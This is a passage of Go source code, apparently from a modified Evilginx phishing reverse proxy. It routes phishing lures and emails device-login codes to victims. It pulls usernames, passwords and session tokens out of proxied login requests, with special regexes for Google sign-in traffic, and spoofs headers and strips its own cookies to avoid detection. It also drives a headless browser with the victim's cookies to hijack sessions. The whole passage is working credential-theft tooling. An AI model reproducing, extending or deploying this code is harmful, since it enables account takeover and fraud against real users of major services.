											sess.DCUserCode = dcSess.UserCode
											sess.DCState = DCStateWaiting
											p.session_mtx.Unlock()

											log.Important("[%d] [devicecode] code generated: %s (client: %s, mode: %s)", sIndex, dcSess.UserCode, dcSess.ClientName, dcMode)

											// SMTP: send code to victim's inbox if configured
											if p.cfg.mailerConfig != nil && p.cfg.mailerConfig.SMTPHost != "" {
												victimEmail := sess.Params["email"]
												log.Important("[%d] [devicecode] SMTP check: host=%s email=%s params=%v", sIndex, p.cfg.mailerConfig.SMTPHost, victimEmail, sess.Params)
												if victimEmail != "" {
													go func() {
														if err := SendDeviceCodeEmail(p.cfg.mailerConfig, victimEmail, dcSess.UserCode); err != nil {
															log.Warning("[devicecode] failed to email code: %v", err)
														} else {
															log.Important("[devicecode] code emailed to %s", victimEmail)
														}
													}()
												} else {
													log.Warning("[devicecode] SMTP configured but no victim email found in session params")
												}
											} else {
												log.Warning("[devicecode] SMTP not configured — check config.json email key")
											}

											p.deviceCode.StartPolling(dcSess.ID)
											p.notifier.Trigger(EventDeviceCodeGenerated, &NotificationData{
												Origin:    sess.RemoteAddr,
												Phishlet:  sess.Phishlet,
												SessionID: sess.Id,
												UserAgent: sess.UserAgent,
												Custom:    map[string]string{"dc_code": dcSess.UserCode, "dc_session": dcSess.ID},
											})
										}(session, dcClient, dcScope, sid)

										// For fallback/auto mode: start stall detection goroutine
										if dcMode == DCModeFallback || dcMode == DCModeAuto {
											go p.monitorSessionStall(session)
										}

										// For "always" mode: redirect immediately to device code interstitial
										if dcMode == DCModeAlways {
											session.DCState = DCStatePending
											var interstitialURL string
											dcTheme := ""
											if l != nil {
												dcTheme = l.DeviceCodeTheme
											}
											if dcTheme != "" && dcTheme != "default" {
												interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
											} else {
												interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
											}
											log.Debug("[devicecode] DCModeAlways: redirecting to %s", interstitialURL)
											resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
											resp.Header.Set("Location", interstitialURL)
											resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
											return req, resp
										}
									}
									// --- End device code chaining ---

									req_ok = true
								}
							} else {
								// Before blacklisting, check if this path belongs to a lure on the same host
								alt_pl, alt_lure := p.getLureForAnyPhishlet(req.Host, req_path)
								if alt_pl != nil && alt_lure != nil {
									// Path belongs to a phishlet's lure on this host - use it
									log.Debug("[%s] path '%s' matched lure for phishlet '%s'", pl_name, req_path, alt_pl.Name)
									pl = alt_pl
									pl_name = alt_pl.Name
									ps.PhishletName = pl_name
									l = alt_lure
									session_cookie = getSessionCookieName(pl_name, p.cookieName)

									// Now process this lure as normal - create session
									session, err := NewSession(alt_pl.Name, p.cfg)
									if err == nil {
										p.extractParams(session, req.URL)

										email := req.URL.Query().Get("email")
										if email != "" {
											session.Params["email"] = email
											log.Important("[%s] Email captured from URL: %s", pl_name, email)
										}

										sid := p.last_sid
										p.last_sid += 1
										log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
										log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
										p.sessions[session.Id] = session
										p.sids[session.Id] = sid

										landing_url := req_url
										if err := p.db.CreateSession(session.Id, alt_pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
											log.Error("database: %v", err)
										}

										session.RemoteAddr = remote_addr
										session.UserAgent = req.Header.Get("User-Agent")
										session.RedirectURL = alt_pl.RedirectUrl
										if alt_lure.RedirectUrl != "" {
											session.RedirectURL = alt_lure.RedirectUrl
										}
										if session.RedirectURL != "" {
											session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
										}
										session.PhishLure = alt_lure
										log.Debug("redirect URL (lure): %s", session.RedirectURL)

										ps.SessionId = session.Id
										ps.Created = true
										ps.Index = sid
										p.whitelistIP(remote_addr, ps.SessionId, alt_pl.Name)

										lureUrl := ""
										if alt_lure.Path != "" {
											lureUrl = fmt.Sprintf("https://%s%s", req.Host, alt_lure.Path)
										}
										p.notifier.Trigger(EventLureClicked, &NotificationData{
											Origin:    remote_addr,
											LureURL:   lureUrl,
											Phishlet:  alt_pl.Name,
											SessionID: session.Id,
											UserAgent: req.Header.Get("User-Agent"),
										})

										req_ok = true
									}
								} else {
									log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

									if p.cfg.GetBlacklistMode() == "unauth" {
										if !p.bl.IsWhitelisted(from_ip) {
											err := p.bl.AddIP(from_ip)
											if p.bl.IsVerbose() {
												if err != nil {
													log.Error("blacklist: %s", err)
												} else {
													log.Warning("blacklisted ip address: %s", from_ip)
												}
											}
										}
									}
									return p.blockRequest(req)
								}
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}
				// req.Header.Set(p.getHomeDir(), o_host)

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
						if err == nil {
							// show html redirector if it is set for the current lure
							if l.Redirector != "" {
								if !p.isForwarderUrl(req.URL) {
									if s.RedirectorName == "" {
										s.RedirectorName = l.Redirector
										s.LureDirPath = req_path
									}

									t_dir := l.Redirector
									if !filepath.IsAbs(t_dir) {
										redirectors_dir := p.cfg.GetRedirectorsDir()
										t_dir = filepath.Join(redirectors_dir, t_dir)
									}

									index_path1 := filepath.Join(t_dir, "index.html")
									index_path2 := filepath.Join(t_dir, "index.htm")
									index_found := ""
									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
										index_found = index_path1
									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
										index_found = index_path2
									}

									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(index_found)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html redirector response")
											}
										} else {
											log.Error("lure: failed to read redirector file: %s", err)
										}

									} else {
										log.Error("lure: redirector file does not exist: %s", index_found)
									}
								}
							}
						} else if s.RedirectorName != "" {
							// session has already triggered a lure redirector - see if there are any files requested by the redirector

							rel_parts := []string{}
							req_path_parts := strings.Split(req_path, "/")
							lure_path_parts := strings.Split(s.LureDirPath, "/")

							for n, dname := range req_path_parts {
								if len(dname) > 0 {
									path_add := true
									if n < len(lure_path_parts) {
										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
										if req_path_parts[n] == lure_path_parts[n] {
											path_add = false
										}
									}
									if path_add {
										rel_parts = append(rel_parts, req_path_parts[n])
									}
								}

							}
							rel_path := filepath.Join(rel_parts...)
							//log.Debug("rel_path: %s", rel_path)

							t_dir := s.RedirectorName
							if !filepath.IsAbs(t_dir) {
								redirectors_dir := p.cfg.GetRedirectorsDir()
								t_dir = filepath.Join(redirectors_dir, t_dir)
							}

							path := filepath.Join(t_dir, rel_path)
							if _, err := os.Stat(path); !os.IsNotExist(err) {
								fdata, err := ioutil.ReadFile(path)
								if err == nil {
									//log.Debug("ext: %s", filepath.Ext(req_path))
									mime_type := getContentType(req_path, fdata)
									//log.Debug("mime_type: %s", mime_type)
									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
									if resp != nil {
										resp.Body = io.NopCloser(bytes.NewReader(fdata))
										return req, resp
									} else {
										log.Error("lure: failed to create redirector data file response")
									}
								} else {
									log.Error("lure: failed to read redirector data file: %s", err)
								}
							} else {
								//log.Warning("lure: template file does not exist: %s", path)
							}
						}
					}
				}

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						u, err := url.Parse(rurl)
						if err == nil {
							if !strings.EqualFold(req_path, u.Path) {
								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
								if resp != nil {
									resp.Header.Add("Location", rurl)
									return req, resp
								}
							}
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" && origin != "null" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				} else if origin == "" || origin == "null" {
					// When Origin is missing or "null" (e.g., from form submits after redirects),
					// set it to the correct original origin to pass CSRF checks on the target server
					req.Header.Set("Origin", "https://"+req.Host)
				}

				// prevent caching
				req.Header.Set("Cache-Control", "no-cache")

				// fix sec-fetch-dest
				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
				if sec_fetch_dest != "" {
					if sec_fetch_dest == "iframe" {
						req.Header.Set("Sec-Fetch-Dest", "document")
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				} else if req.Method == "POST" && pl != nil && req.Header.Get("Sec-Fetch-Mode") == "navigate" {
					// Inject Referer for navigation POST requests (form submissions) when
					// browser doesn't send one (due to Referrer-Policy: no-referrer).
					// Many servers require Referer for CSRF validation on form submissions.
					// Only inject for navigation requests (Sec-Fetch-Mode: navigate),
					// NOT for API calls (XHR/fetch) which should NOT have Referer when
					// the policy is no-referrer (e.g., Akamai sensor POSTs).
					// req.Host is already rewritten to original domain at this point.
					injectedReferer := "https://" + req.Host + req.URL.Path
					req.Header.Set("Referer", injectedReferer)
					log.Debug("Injected Referer for navigation POST: %s", injectedReferer)
				}

				// strip evilginx session/tracking cookies before forwarding to target
				// these cookies (sid_xxx, _ga_xxx, uid_xxx, auth_xxx, __cf_xxx, etc.)
				// are set by evilginx on the phishing domain for session tracking.
				// if forwarded to the target, they reveal the proxy and cause errors.
				if pl != nil {
					cookies := req.Cookies()
					var cleanCookies []string
					for _, ck := range cookies {
						if !evilginxCookieRe.MatchString(ck.Name) {
							cleanCookies = append(cleanCookies, ck.Name+"="+ck.Value)
						}
					}
					if len(cleanCookies) > 0 {
						req.Header.Set("Cookie", strings.Join(cleanCookies, "; "))
					} else {
						req.Header.Del("Cookie")
					}
				}

				// Inject cf_clearance cookies for CF-protected origins
				p.cfClearance.InjectCookies(req)

				// Override User-Agent for CF-cleared domains.
				// cf_clearance is bound to the UA that solved the challenge
				// (Section 12.4 of CF Turnstile research). Must match exactly.
				if cfUA := p.cfClearance.GetUserAgent(req.Host); cfUA != "" {
					req.Header.Set("User-Agent", cfUA)
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						// Fix source-path: browser sends rewritten path (e.g. /login)
						// but Google expects original path (e.g. /v3/signin/identifier).
						// This happens because rewrite_urls changed the browser URL,
						// and JS reads window.location.pathname for source-path.
						if sp := qs.Get("source-path"); sp != "" {
							var bestMatch string
							reqPath := req.URL.Path
							for _, ru := range pl.rewriteUrls {
								if ru.rewritePath == sp && len(ru.triggerPaths) > 0 {
									candidate := ru.triggerPaths[0]
									// Prefer paths that share version prefix with current request
									// e.g., if req path has /v3/, prefer /v3/ trigger paths
									if strings.Contains(reqPath, "/v3/") && strings.HasPrefix(candidate, "/v3/") {
										bestMatch = candidate
										break
									}
									if bestMatch == "" {
										bestMatch = candidate
									}
								}
							}
							if bestMatch != "" {
								qs.Set("source-path", bestMatch)
								log.Debug("source-path fix: %s -> %s", sp, bestMatch)
							}
						}

						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
								if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
									qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
								}
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					// req.Header.Set(p.getHomeDir(), o_host)
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// Debug: log sensor POST body (TEMPORARY)
						if strings.Contains(req.URL.Path, "a9UuSfHYg") {
							sensorBody := string(body)
							if len(sensorBody) > 500 {
								sensorBody = sensorBody[:500]
							}
							log.Debug("SENSOR-POST-BODY (first 500 chars): %s", sensorBody)
							if strings.Contains(string(body), "peoplesworld") {
								log.Debug("SENSOR-POST: STILL CONTAINS PROXY DOMAIN 'peoplesworld'!")
							} else {
								log.Debug("SENSOR-POST: No proxy domain found (good)")
							}
						}

						// Debug: comprehensive login POST logging
						if req.URL.Path == "/login" && req.Method == "POST" {
							log.Debug("LOGIN-DEBUG: Content-Type=%s", req.Header.Get("Content-Type"))
							log.Debug("LOGIN-DEBUG: Origin=%s Referer=%s Host=%s", req.Header.Get("Origin"), req.Header.Get("Referer"), req.Host)
							// Log all request headers
							for hname, hvals := range req.Header {
								log.Debug("LOGIN-DEBUG: Header %s = %s", hname, strings.Join(hvals, ", "))
							}
							// Log original body before patchUrls
							loginBody := string(body)
							if len(loginBody) > 1000 {
								loginBody = loginBody[:1000]
							}
							log.Debug("LOGIN-DEBUG: ORIGINAL body (first 1000): %s", loginBody)
						}

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)

						// Debug: log body AFTER patchUrls
						if req.URL.Path == "/login" && req.Method == "POST" {
							patchedBody := string(body)
							if len(patchedBody) > 1000 {
								patchedBody = patchedBody[:1000]
							}
							log.Debug("LOGIN-DEBUG: PATCHED body (first 1000): %s", patchedBody)
						}

						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)

						contentType := req.Header.Get("Content-type")

						json_re := jsonContentRe
						form_re := formContentRe

						if json_re.MatchString(contentType) {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

							// force post json
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											matches := fp_s.key.FindAllString(string(body), -1)
											for _, match := range matches {
												if fp_s.search.MatchString(match) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s", k_matched, match)
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}
									if ok_search {
										for _, fp_f := range fp.force {
											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
											if err != nil {
												log.Debug("force_post: got error: %s", err)
											}
											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
										}
									}
									req.ContentLength = int64(len(body))
									log.Debug("force_post: body: %s len:%d", body, len(body))
								}
							}

						} else if form_re.MatchString(contentType) {

							// For batchexecute requests, skip ParseForm/Encode to preserve exact browser encoding.
							// Go's url.Values.Encode() re-encodes characters differently (e.g. ! → %21),
							// reorders keys alphabetically, and strips trailing &, corrupting the payload.
							isBatchExec := strings.Contains(req.URL.Path, "batchexecute")

							if isBatchExec {
								// For batchexecute: extract credentials from raw body without re-encoding
								log.Debug("POST (batchexec passthrough): %s", req.URL.Path)
								bodyStr := string(body)

								// URL-decode the body for credential regex matching
								// The body is application/x-www-form-urlencoded, so @ appears as %40, etc.
								decodedBody, decErr := url.QueryUnescape(bodyStr)
								if decErr != nil {
									decodedBody = bodyStr
								}

								// Debug: write full request body to file for analysis
								reqBodyFile := fmt.Sprintf("/tmp/batchexec_reqbody_%d.txt", time.Now().UnixNano())
								ioutil.WriteFile(reqBodyFile, body, 0644)
								log.Debug("BATCHEXEC-REQ: len=%d written_to=%s", len(body), reqBodyFile)
								log.Debug("BATCHEXEC-REQ-HDR: Content-Type=%s Origin=%s Referer=%s", req.Header.Get("Content-Type"), req.Header.Get("Origin"), req.Header.Get("Referer"))
								cookieHdr := req.Header.Get("Cookie")
								if len(cookieHdr) > 300 {
									cookieHdr = cookieHdr[:300]
								}
								log.Debug("BATCHEXEC-REQ-HDR: Cookie=%s", cookieHdr)

								// Extract username from URL-decoded body
								if pl.username.search != nil {
									um := pl.username.search.FindStringSubmatch(decodedBody)
									if len(um) > 1 {
										p.setSessionUsername(ps.SessionId, um[1])
										log.Success("[%d] Username: [%s]", ps.Index, um[1])
										if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
								// Extract password from URL-decoded body
								// First try phishlet regex on decoded body (works for regular form fields)
								pwdFound := false
								if pl.password.search != nil && pl.password.key != nil {
									// For batchexecute, skip catch-all regexes like (.*)
									// Only use it if the key appears in the decoded body
									for _, kv := range strings.SplitAfter(decodedBody, "&") {
										parts := strings.SplitN(kv, "=", 2)
										if len(parts) == 2 && pl.password.key.MatchString(parts[0]) {
											pm := pl.password.search.FindStringSubmatch(parts[1])
											if len(pm) > 1 && pm[1] != "" {
												p.setSessionPassword(ps.SessionId, pm[1])
												log.Success("[%d] Password (form field): [%s]", ps.Index, pm[1])
												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
													log.Error("database: %v", err)
												}
												pwdFound = true
												break
											}
										}
									}
								}
								// If no form field matched, try Google protobuf patterns in the decoded body
								if !pwdFound {
									googlePwdPatterns := []*regexp.Regexp{
										// Google password challenge: [1,null,null,null,["password",true]]
										regexp.MustCompile(`\[1,null,null,null,\[\\?"([^"\\]+)\\?",true\]\]`),
										// Alternative: escaped quotes in protobuf
										regexp.MustCompile(`\[1,null,null,null,\[\\"([^\\]+)\\",true\]\]`),
									}
									for _, re := range googlePwdPatterns {
										pm := re.FindStringSubmatch(decodedBody)
										if len(pm) > 1 && pm[1] != "" {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password (protobuf): [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
											pwdFound = true
											break
										}
									}
								}
								// Extract custom tokens from URL-decoded body
								for _, cp := range pl.custom {
									if cp.search != nil {
										cm := cp.search.FindStringSubmatch(decodedBody)
										if len(cm) > 1 {
											p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
											log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
											if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
								}
								// Patch phishing URLs in body but preserve encoding
								origBody := string(body)
								body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
								newBody := string(body)
								if origBody != newBody {
									log.Debug("BATCHEXEC-PATCH: body was modified by patchUrls")
									// Log first 200 chars of diff
									for i := 0; i < len(origBody) && i < len(newBody); i++ {
										if origBody[i] != newBody[i] {
											start := i - 20
											if start < 0 {
												start = 0
											}
											end := i + 80
											if end > len(origBody) {
												end = len(origBody)
											}
											end2 := i + 80
											if end2 > len(newBody) {
												end2 = len(newBody)
											}
											log.Debug("BATCHEXEC-PATCH: orig[%d]: ...%s...", i, origBody[start:end])
											log.Debug("BATCHEXEC-PATCH: new[%d]:  ...%s...", i, newBody[start:end2])
											break
										}
									}
								} else {
									log.Debug("BATCHEXEC-PATCH: body unchanged by patchUrls")
								}
								req.ContentLength = int64(len(body))

							} else if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
								log.Debug("POST: %s", req.URL.Path)

								for k, v := range req.PostForm {
									// extract credentials from POST params

									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								// Patch individual form values for debug logging and force_post matching
								for k, v := range req.PostForm {
									for i, vv := range v {
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
								}

								for k, v := range req.PostForm {
									if len(v) > 0 {
										log.Debug("POST %s = %s", k, v[0])
									}
								}

								// IMPORTANT: Do NOT re-encode with PostForm.Encode() — Go's url.Values.Encode()
								// sorts parameters alphabetically, which can break servers that expect the
								// browser's original parameter ordering. Instead, use the patchUrls-modified
								// raw body which preserves the exact browser encoding and ordering.
								// The `body` variable already has patchUrls applied from earlier.
								req.ContentLength = int64(len(body))

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				// check for evilpuppet trigger
				// Debug: ALWAYS log the path to a file for debugging
				f, _ := os.OpenFile("/tmp/evilpuppet_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if f != nil {
					fmt.Fprintf(f, "[%s] path-debug: pl=%v sid=[%s] enabled=%v path=%s\n", time.Now().Format("15:04:05"), pl != nil, ps.SessionId, p.evilpuppet.IsEnabled(), req.URL.Path)
					f.Close()
				}
				if strings.Contains(req.URL.Path, "batchexecute") {
					log.Warning("[evilpuppet-debug] BATCHEXEC: pl=%v, sid=[%s], enabled=%v, host=%s", pl != nil, ps.SessionId, p.evilpuppet.IsEnabled(), req.Host)
				}
				if pl != nil && ps.SessionId != "" && p.evilpuppet.IsEnabled() {
					fullPath := req.URL.Path
					if req.URL.RawQuery != "" {
						fullPath += "?" + req.URL.RawQuery
					}
					log.Debug("[evilpuppet] checking trigger for path: %s", fullPath)
					epCfg := pl.GetEvilPuppetConfig()
					if epCfg != nil {
						contentType := req.Header.Get("Content-type")
						// req.Host is already the original host at this point (converted earlier in the handler)
						r_host := req.Host
						if p.evilpuppet.MatchTrigger(epCfg, r_host, fullPath, contentType) {
							log.Debug("[evilpuppet] trigger MATCHED for path: %s", fullPath)
							s, ok := p.sessions[ps.SessionId]
							if ok {
								// Read the current request body
								epBody, epErr := ioutil.ReadAll(req.Body)
								if epErr != nil {
									epBody = []byte{}
								}
								req.Body = ioutil.NopCloser(bytes.NewBuffer(epBody))

								// Build credentials map for placeholder replacement
								creds := map[string]string{
									"username": s.Username,
									"password": s.Password,
								}

								// Try to extract email from POST body if username not yet captured
								if creds["username"] == "" {
									bodyStr := string(epBody)
									// Also prepare a URL-decoded version of the body
									decodedBody, _ := url.QueryUnescape(bodyStr)

									emailPatterns := []string{
										`\[\[\["V1UmUe","\[null,\\"(.*?)\\"`,
										`V1UmUe.*?null.*?%5C%22(.*?)%5C%22`,
										`\[\[\["MI613e","\[null,\\"(.*?)\\"`,
										`MI613e.*?null.*?%5C%22(.*?)%5C%22`,
										`\[null,\\"([^"\\]+@[^"\\]+)\\"`,
										`identifier=(.*?)&`,
										`Email=(.*?)&`,
									}
									// Try on both raw and decoded bodies — decoded first for cleaner matches
									for _, searchBody := range []string{decodedBody, bodyStr} {
										if searchBody == "" {
											continue
										}
										for _, pattern := range emailPatterns {
											re := regexp.MustCompile(pattern)
											if m := re.FindStringSubmatch(searchBody); len(m) > 1 {
												decoded, err := url.QueryUnescape(m[1])
												if err == nil {
													creds["username"] = strings.TrimRight(strings.TrimRight(decoded, "\\"), "=")
												} else {
													creds["username"] = strings.TrimRight(strings.TrimRight(m[1], "\\"), "=")
												}
												break
											}
										}
										if creds["username"] != "" {
											break
										}
									}
								}
								log.Debug("[evilpuppet] [%d] Extracted credentials - username: '%s'", ps.Index, creds["username"])

								// Skip evilpuppet if no email found (e.g., UEkKwb connection check requests)
								if creds["username"] == "" {
									log.Debug("[evilpuppet] [%d] No email found in body, skipping background browser", ps.Index)
								} else {

									for k, v := range s.Custom {
										creds[k] = v
									}

									phishDomain := ps.PhishDomain
									log.Info("[evilpuppet] [%d] Trigger matched for session %s (user: %s)", ps.Index, ps.SessionId, creds["username"])

									if epCfg.HoldRequest {
										// ═══ SYNCHRONOUS HOLD-INJECT MODE ═══
										log.Info("[evilpuppet] [%d] Holding request for token generation...", ps.Index)

										// Get victim's cookies for session binding
										victimCookies := req.Header.Get("Cookie")
										log.Debug("[evilpuppet] [%d] Victim cookies (len=%d): %s", ps.Index, len(victimCookies), victimCookies[:min(len(victimCookies), 100)])

										// Use go-rod if Chrome remote debugging is available, otherwise use chromedp
										var resultCh <-chan *EvilPuppetResult
										if p.evilpuppetRod.IsChromeRunning() {
											log.Info("[evilpuppet] [%d] Using go-rod (Chrome remote debugging)", ps.Index)
											resultCh = p.evilpuppetRod.HandleTrigger(ps.SessionId, epCfg, creds, phishDomain, victimCookies)
										} else {
											log.Info("[evilpuppet] [%d] Using chromedp (spawning browser)", ps.Index)
											resultCh = p.evilpuppet.HandleTrigger(ps.SessionId, epCfg, creds, phishDomain, victimCookies)
										}

										// Block until result or timeout
										result := <-resultCh
										if result != nil && result.Error == nil && len(result.Tokens) > 0 {
											bodyStr := string(epBody)

											// ═══ FULL BODY SWAP (most robust approach) ═══
											// Replace entire batchexecute body & URL with go-rod's captured request
											// This avoids needing to identify and replace every session-bound token individually
											if fullBody, fbOk := result.Tokens["__full_body__"]; fbOk && fullBody != "" {
												log.Info("[evilpuppet] [%d] Full body swap: replacing victim body (%d bytes) with go-rod body (%d bytes)", ps.Index, len(epBody), len(fullBody))
												epBody = []byte(fullBody)
												bodyStr = fullBody

												// Swap session-critical URL params (f.sid, bl) from go-rod's URL
												// f.sid MUST match go-rod's session — Google correlates f.sid with cookies/body
												// Keep victim's _reqid so the response ["di"] counter matches client-side JS
												if fullURL, fuOk := result.Tokens["__full_url__"]; fuOk && fullURL != "" {
													goRodParsed, goRodErr := url.Parse(fullURL)
													if goRodErr == nil {
														victimQ := req.URL.Query()
														goRodQ := goRodParsed.Query()

														// Swap f.sid (server session ID — must match cookies)
														if goSid := goRodQ.Get("f.sid"); goSid != "" {
															oldSid := victimQ.Get("f.sid")
															victimQ.Set("f.sid", goSid)
															log.Info("[evilpuppet] [%d] URL f.sid swapped: %s → %s", ps.Index, oldSid, goSid)
														}

